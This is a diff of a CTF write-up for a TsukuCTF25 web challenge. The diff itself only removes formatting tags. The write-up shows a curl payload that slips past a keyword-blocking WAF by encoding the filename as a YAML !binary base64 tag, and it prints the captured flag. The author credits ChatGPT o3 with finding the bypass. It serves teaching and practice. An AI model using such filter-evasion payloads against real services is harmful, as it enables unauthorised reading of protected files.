@@ -30,7 +30,6 @@ layout:
 
 The challenge comes with source code, `server.js` is most relevant.
 
-{% code overflow="wrap" %}
 ```js
 const express = require("express");
 const bodyParser = require("body-parser");
@@ -66,7 +65,6 @@ app.listen(3000, () => {
     console.log("Server listening on port 3000");
 });
 ```
-{% endcode %}
 
 ### Breaking it down
 
@@ -88,13 +86,11 @@ WAF checks if:
 
 The challenge description already gave a sample curl command.
 
-{% code overflow="wrap" %}
 ```bash
 curl -X POST "http://challs.tsukuctf.org:50001" -H "Content-Type: text/plain" -d "file: flag.txt"
 
 Not allowed!
 ```
-{% endcode %}
 
 Imagine if it gave the flag 😆 It doesn't since "flag" is a blocked keyword.
 
@@ -104,13 +100,11 @@ I checked this [guide](https://book.jorianwoltjer.com/languages/yaml#javascript-
 
 I searched through previous CTF writeups but wasn't getting anywhere. Eventually, I swapped the ChatGPT model from `o4` to `o3` and found a working solution.
 
-{% code overflow="wrap" %}
 ```bash
 curl -X POST "http://challs.tsukuctf.org:50001" -H "Content-Type: text/plain" --data-binary $'%TAG !b! tag:yaml.org,2002:\n---\nfile: !b!binary "ZmxhZy50eHQ="'
 
 TsukuCTF25{YAML_1s_d33p!}
 ```
-{% endcode %}
 
 Here's the logic behind the payload:
 
